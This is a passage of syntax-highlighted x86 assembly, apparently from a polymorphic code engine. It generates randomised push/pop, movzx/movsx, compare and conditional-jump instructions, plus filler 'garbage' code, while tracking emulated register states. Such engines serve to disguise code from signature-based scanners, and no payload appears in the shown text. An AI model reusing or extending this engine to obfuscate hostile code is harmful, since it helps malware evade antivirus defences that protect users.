                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; all register values unknow</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ('coz multiple calls)</span><span class="sc0">

</span><span class="sc1">; prolog</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">
</span><span class="sc5">@@push_loop</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">bsf</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; smart idea</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@push_done</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@push_loop</span><span class="sc0">
</span><span class="sc5">@@push_done</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; body</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
</span><span class="sc1">; epilog</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">       </span><span class="sc1">; pop mask</span><span class="sc0">
</span><span class="sc5">@@pop_loop</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">bsr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@pop_done</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">              </span><span class="sc1">;POP regs 1 at once</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@pop_loop</span><span class="sc0">
</span><span class="sc5">@@pop_done</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; retn</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; param frame size</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@simpleret</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; C3-&gt;C2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; RET ? clean paramz</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">@@simpleret</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@state_pop</span><span class="sc0">

</span><span class="sc1">; restore all the state</span><span class="sc0">
                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@e_no_jmps</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; 5 bytes (unrealized JMP) at EDI</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@e_done</span><span class="sc0">

</span><span class="sc5">@@e_no_jmps</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@e_done</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">in_subroutine</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- misc ------------------------------------------------</span><span class="sc0">

</span><span class="sc5">@@state_push</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">regavail</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">state_begin</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">state_end</span><span class="sc0">
</span><span class="sc5">@@push_cycle</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@push_cycle</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">@@state_pop</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">state_begin</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">state_end</span><span class="sc0">
</span><span class="sc5">@@pop_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@pop_cycle</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">; --------------------- movsxzx ---------------------------------------------</span><span class="sc0">

</span><span class="sc5">@@movsxzx</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_MOVSXZX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">REG2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@use_xl</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">       </span><span class="sc1">;use high 8 bits (AH,BH,...)</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">REG2_8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@@use_xl</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@movsx</span><span class="sc0">

</span><span class="sc5">@@movzx</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B60Fh</span><span class="sc0">           </span><span class="sc1">;movzx</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stos_sxzx</span><span class="sc0">

</span><span class="sc5">@@movsx</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BE0Fh</span><span class="sc0">           </span><span class="sc1">;movsx</span><span class="sc0">
                        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">@@stos_sxzx</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modrm</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- push reg ; poly_cmd() ; pop_reg----------------------</span><span class="sc0">

</span><span class="sc5">@@pushrp</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_PUSHPOPR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">                    </span><span class="sc1">; push reg</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@pop</span><span class="sc0">

</span><span class="sc5">@@puship</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_PUSHPOPC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@imm_d</span><span class="sc0">

</span><span class="sc5">@@imm_b</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">              </span><span class="sc1">; push byte</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@pop</span><span class="sc0">

</span><span class="sc5">@@imm_d</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">                        </span><span class="sc1">; push dword</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">@@pop</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">                    </span><span class="sc1">;pop reg</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- cmp r, r/c ; jxx ------------------------------------</span><span class="sc0">

</span><span class="sc5">@@cmp_i_follow</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_IFOLLOW</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tempo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@cmp_i</span><span class="sc0">

</span><span class="sc5">@@cmp_i_nofollow</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_INOFOLLOW</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tempo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@cmp_i</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@longcmp</span><span class="sc0">
                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSHORT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@longcmp</span><span class="sc0"> </span><span class="sc1">; if skip short opcs</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">              </span><span class="sc1">; short form for eax</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@cmpeaxboth</span><span class="sc0">

</span><span class="sc5">@@longcmp</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">           </span><span class="sc1">; CMP</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">@@cmpeaxboth</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Z</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@useit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">        </span><span class="sc1">; ecx</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSHORT_C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@useit</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@useit</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">     </span><span class="sc1">; EAX ?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@longcmp</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">   </span><span class="sc1">; 81-&gt;83, short form</span><span class="sc0">
                        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; to pass EAX to @@outcond</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@outcond</span><span class="sc0">

</span><span class="sc5">@@useit</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@outcond</span><span class="sc0">

</span><span class="sc5">@@cmp_r_follow</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_RFOLLOW</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tempo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@cmp_r</span><span class="sc0">

</span><span class="sc5">@@cmp_r_nofollow</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_RNOFOLLOW</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tempo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@cmp_r</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">       </span><span class="sc1">; 'coz of @@swap</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">         </span><span class="sc1">; cmp r,r</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@swap</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modrm</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">REG2</span><span class="sc0"> </span><span class="sc5">REG1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@@outcond</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">seto</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">setb</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sete</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">setbe</span><span class="sc0">   </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sets</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">setp</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">setl</span><span class="sc0">    </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">setle</span><span class="sc0">   </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">jxxcond</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tempo</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@dont_follow</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc0"> </span><span class="sc1">; invert condition + short2near</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; +1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip_do1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;convert to jcc</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@dont_follow</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
